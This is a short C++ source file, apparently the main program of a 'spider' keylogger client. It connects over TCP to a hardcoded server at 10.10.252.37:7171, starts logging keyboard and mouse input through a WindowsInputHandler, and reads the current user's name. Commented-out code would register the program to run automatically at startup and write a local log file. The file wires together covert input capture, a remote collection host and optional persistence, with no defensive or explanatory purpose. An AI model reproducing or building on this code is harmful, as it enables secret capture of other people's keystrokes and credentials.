// ConsoleApplication1.cpp : définit le point d'entrée pour l'application console.
//
#include <iostream>
#include <Windows.h>
#include <lmcons.h>

#include "client/WindowsInputHandler.hpp"
//#include "WindowsLogHandler.hpp"
//#include "AutoStart.hpp"

spider::socket::ClientTcpSocket sock("10.10.252.37", 7171);

void MessageLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		std::cout << "toto" << std::endl;
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

int main(int ac, char **av)
{
	//spider::AutoStart *tata = new spider::AutoStart();
	//if (tata->isProgramRegistered(L"ConsoleApplication1"))
	//{
	//	//std::cout << "Program is already registered for auto startup." << std::endl;
	//}
	//else
	//{
	//	tata->RegisterProgram();
	//	//std::cout << "Registering program for auto startup..." << std::endl;
	//}

	//spider::WindowsLogHandler *tutu = new spider::WindowsLogHandler();
	//tutu->createFile("logs");

	WSADATA WSAData;
	WSAStartup(MAKEWORD(2, 0), &WSAData);

	sock.connect();
	if (sock.startedService())
	{
		std::cout << "CONNECTED !" << std::endl;
	}
	else
	{
		std::cout << "NOT CONNECTED !" << std::endl;
	}

	spider::WindowsInputHandler *inputHandler = new spider::WindowsInputHandler((LPVOID)av[0]);
	inputHandler->startLogging(true, true);

	TCHAR userName[UNLEN + 1];
	DWORD userNameLength = UNLEN + 1;

	GetUserName((TCHAR*)userName, &userNameLength);

	MessageLoop();

	WSACleanup();
	return 0;
}

